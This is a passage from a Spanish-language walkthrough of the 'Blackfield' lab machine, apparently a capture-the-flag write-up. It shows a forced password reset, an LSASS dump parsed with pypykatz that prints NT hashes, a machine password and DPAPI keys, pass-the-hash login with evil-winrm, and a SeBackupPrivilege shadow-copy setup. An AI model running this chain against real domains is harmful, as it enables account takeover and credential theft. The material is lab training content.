# sudo neo4j console
```

Nos dirigimos a `http://localhost:7474` y `rellenamos` los `datos` con las credenciales `neo4j:neo4j`

![](/assets/img/Blackfield/image_1.png)

`Introducimos` una `contraseña`

![](/assets/img/Blackfield/image_2.png)

Nos `abrimos` el `bloodhound` y nos `logueamos`

![](/assets/img/Blackfield/image_3.png)

Nos vamos al `bloodhound` y pulsamos en `Upload data`

![](/assets/img/Blackfield/image_4.png)

Una vez subidos los `datos` pulsamos en `First Degree Object Control`

![](/assets/img/Blackfield/image_5.png)

Podemos `obtener` la `contraseña` del usuario `audit2020` mediante un `ForceChangePassword`

![](/assets/img/Blackfield/image_6.png)

Le `cambiamos` la `contraseña`

![](/assets/img/Blackfield/image_7.png)

```
# net rpc password "audit2020" "newP@ssword2022" -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" -S "DC01.BLACKFIELD.local"
```

`Validamos` las `credenciales`

```
# netexec smb 10.129.153.116 -u audit2020 -p 'newP@ssword2022'    
SMB         10.129.153.116  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.153.116  445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2022 
```

Vemos que este usuario tiene `acceso` a la carpeta `forensic`

```
# netexec smb 10.129.153.116 -u audit2020 -p 'newP@ssword2022' --shares
SMB         10.129.153.116  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.153.116  445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2022 
SMB         10.129.153.116  445    DC01             [*] Enumerated shares
SMB         10.129.153.116  445    DC01             Share           Permissions     Remark
SMB         10.129.153.116  445    DC01             -----           -----------     ------
SMB         10.129.153.116  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.153.116  445    DC01             C$                              Default share
SMB         10.129.153.116  445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.153.116  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.153.116  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.153.116  445    DC01             profiles$       READ            
SMB         10.129.153.116  445    DC01             SYSVOL          READ            Logon server share 
```

Nos `conectamos` por `smb` y `descargamos` todo el `contenido` que se comparte

```
# smbclient -U 'audit2020%newP@ssword2022' //10.129.153.116/forensic
Try "help" to get a list of possible commands.
smb: \> PROMPT OFF
smb: \> RECURSE ON
smb: \> mget *
```

Vemos un dump de `LSASS`, el cual es un servicio crucial en `Windows` que maneja la `autenticación local y remota`, validando `inicios de sesión, tokens de acceso y otros aspectos de la seguridad`

```
# ls
 conhost.zip   dfsrs.zip     ismserv.zip   lsass.zip   RuntimeBroker.zip
 ctfmon.zip    dllhost.zip   lsass.DMP     mmc.zip     ServerManager.zip
```

`Extraemos` las `credenciales` del `dumpeo` del `lsass`

```
# pypykatz lsa minidump lsass.DMP            
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [633ba]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.218491+00:00
sid S-1-5-96-0-2
luid 365835
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5950b]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 365493 (593b5)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:59:38.200147+00:00
sid S-1-5-96-0-2
luid 365493
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [593b5]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 257142 (3ec76)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:59:13.318909+00:00
sid S-1-5-18
luid 257142
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
	== MSV ==
		Username: Administrator
		Domain: BLACKFIELD
		LM: NA
		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
		SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
		DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: Administrator
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [25869]==
		username Administrator
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [25869]==
		luid 153705
		key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
		masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
		sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9

== LogonSession ==
authentication_id 137110 (21796)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:27.068590+00:00
sid S-1-5-18
luid 137110
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134695 (20e27)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:26.678019+00:00
sid S-1-5-18
luid 134695
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 40310 (9d76)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40310
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [9d76]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 40232 (9d28)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:57:46.897202+00:00
sid S-1-5-90-0-1
luid 40232
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [9d28]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:46.725846+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [3e4]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24410 (5f5a)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-1
luid 24410
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5f5a]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
	== MSV ==
		Username: svc_backup
		Domain: BLACKFIELD
		LM: NA
		NT: 9658d1d1dcd9250115e2205d9f48400d
		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
		DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: svc_backup
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [633e3]==
		username svc_backup
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [633e3]==
		luid 406499
		key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
		masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
		sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991

== LogonSession ==
authentication_id 366665 (59849)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366665
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [59849]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 366649 (59839)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2020-02-23T17:59:38.293877+00:00
sid S-1-5-90-0-2
luid 366649
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [59839]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 256940 (3ebac)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:59:13.068835+00:00
sid S-1-5-18
luid 256940
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 136764 (2163c)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:27.052945+00:00
sid S-1-5-18
luid 136764
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 134935 (20f17)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:58:26.834285+00:00
sid S-1-5-18
luid 134935
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server 
logon_time 2020-02-23T17:57:47.162285+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username: 
		Domain: 

== LogonSession ==
authentication_id 24405 (5f55)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.569111+00:00
sid S-1-5-96-0-0
luid 24405
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5f55]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24294 (5ee6)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-0
luid 24294
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5ee6]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 24282 (5eda)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server 
logon_time 2020-02-23T17:57:46.554117+00:00
sid S-1-5-96-0-1
luid 24282
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: DC01$
		Domain: BLACKFIELD.local
		Password: &SYVE+<ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&G3K'mH:&'K^SW$FNWWx7J-N$^'bzB1Duc3^Ez]En kh`b'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'<Vb0I6
		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
	== WDIGEST [5eda]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)

== LogonSession ==
authentication_id 22028 (560c)
session_id 0
username 
domainname 
logon_server 
logon_time 2020-02-23T17:57:44.959593+00:00
sid None
luid 22028
	== MSV ==
		Username: DC01$
		Domain: BLACKFIELD
		LM: NA
		NT: b624dc83a27cc29da11d9bf25efea796
		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
		DPAPI: 0000000000000000000000000000000000000000

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username DC01$
domainname BLACKFIELD
logon_server 
logon_time 2020-02-23T17:57:44.913221+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== Kerberos ==
		Username: dc01$
		Domain: BLACKFIELD.LOCAL
	== WDIGEST [3e7]==
		username DC01$
		domainname BLACKFIELD
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
	== DPAPI [3e7]==
		luid 999
		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
	== DPAPI [3e7]==
		luid 999
		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
	== DPAPI [3e7]==
		luid 999
		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
```

Nos conectamos a la máquina víctima como el usuario svc_backup haciendo `Pass The Hast` mediante evil-winrm

```
# evil-winrm -i 10.129.153.116 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d' 
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

## Privilege Escalation

`Listamos` los `privilegios` que tiene nuestro usuario y vemos que pertenece al grupo de `Backup Operators`, voy a estar siguiendo los pasos de [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

USER INFORMATION
----------------

User Name             SID
===================== ==============================================
blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`Creamos` un `fichero` llamado `vss.dsh`

```
set context persistent nowriters
set metadata c:\\programdata\\test.cab        
set verbose on
add volume c: alias test
create
expose %test% z:
```

`Cambiamos` el `formato` del `archivo`

```
# unix2dos vss.dsh
```

Como formamos parte del grupo `Backup Operators` tenemos el `privilegios` de `restaurar` y hacer `copias` de `archivos` y `directorios`. Para explotar esto, nos descargamos las `DLL` [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug) y los subimos a la máquina víctima junto con el archivo `.dsh`, para ello debemos conectarnos desde el `mismo directorio` donde se encuentran estos archivos

```
# evil-winrm -i 10.129.153.116 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'  
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd c:\\programdata
*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeCmdLets.dll
                                        
Info: Uploading /home/justice-reaper/Downloads/SeBackupPrivilegeCmdLets.dll to C:\programdata\SeBackupPrivilegeCmdLets.dll
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload SeBackupPrivilegeUtils.dll
                                        
Info: Uploading /home/justice-reaper/Downloads/SeBackupPrivilegeUtils.dll to C:\programdata\SeBackupPrivilegeUtils.dll
                                        
Data: 21844 bytes of 21844 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata> upload vss.dsh
                                        
Info: Uploading /home/justice-reaper/Downloads/vss.dsh to C:\programdata\vss.dsh
                                        
Info: Upload successful!
```

`Importamos` los `módulos`

```
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\programdata> import-module .\SeBackupPrivilegeUtils.dll
```

Ejecutamos ` `

```
*Evil-WinRM* PS C:\programdata> diskshadow /s c:\\programdata\\vss.dsh
